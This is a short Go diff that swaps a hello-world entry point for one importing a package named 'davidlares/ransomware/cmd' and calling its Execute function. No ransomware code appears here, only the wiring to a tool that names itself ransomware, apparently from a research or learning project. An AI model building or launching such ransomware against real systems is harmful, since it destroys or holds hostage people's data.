@@ -1,7 +1,9 @@
 package main
 
-import "fmt"
+import (
+	"davidlares/ransomware/cmd"
+)
 
 func main() {
-    fmt.Println("Hello, World!")
+	cmd.Execute()
 }
